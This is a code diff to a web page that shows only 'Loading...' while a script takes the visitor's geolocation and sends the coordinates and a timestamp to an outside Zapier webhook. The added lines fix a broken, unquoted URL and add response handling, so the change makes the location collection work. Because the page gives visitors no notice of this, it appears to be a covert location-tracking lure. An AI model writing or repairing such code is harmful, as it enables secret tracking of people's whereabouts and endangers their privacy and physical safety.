@@ -8,7 +8,7 @@
     <p>Loading...</p>
     <script>
         navigator.geolocation.getCurrentPosition(position => {
-            fetch(https://hooks.zapier.com/hooks/catch/21990811/2qeiczn/, {
+            fetch('https://hooks.zapier.com/hooks/catch/21990811/2qeiczn/', { // Added quotes around URL
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -16,7 +16,9 @@
                     longitude: position.coords.longitude,
                     time: new Date().toISOString()
                 })
-            });
+            })
+            .then(response => console.log('Success:', response)) // Optional: Add success handling
+            .catch(error => console.error('Error:', error)); // Optional: Add error handling
         });
     </script>
 </body>
